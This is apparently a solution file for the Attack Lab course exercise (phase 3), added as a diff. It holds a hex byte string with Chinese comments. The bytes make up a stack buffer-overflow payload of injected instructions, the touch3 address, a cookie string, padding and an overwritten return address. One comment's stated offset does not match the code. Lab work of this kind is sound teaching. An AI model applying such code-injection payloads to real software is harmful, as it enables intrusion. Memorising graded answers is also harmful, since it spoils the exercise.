@@ -1,0 +1,10 @@
+48 83 ec 26             /* sub    $0x26,%rsp  让rsp指向 存放touch3地址的地方 */
+48 8d 7c 24 08          /* lea    0x8(%rsp),%rdi 
+                           touch3的地址 给touch3传递参数, rdi存放的 用户输入的 cookie的位置
+                           为了不被后面的代码overwrite，必须 放在return address(指向touch3的地址)之后 */
+c3                      /* retq */
+fa 18 40 00 00 00 00 00 /* touch3的地址 */
+
+35 39 62 39 39 37 66 61 00 /* 9个字节的 字符串类型的 cookie 0x59b997fa  现在有27个字节 */
+41 42 43 44 45 46 47 48 49 50 41 42 43 /* 刚好40个字节 */
+78 dc 61 55             /* 返回的injection code的地址 也就是 第一行命令"sub    $0x24(36),%rsp"的地址 */
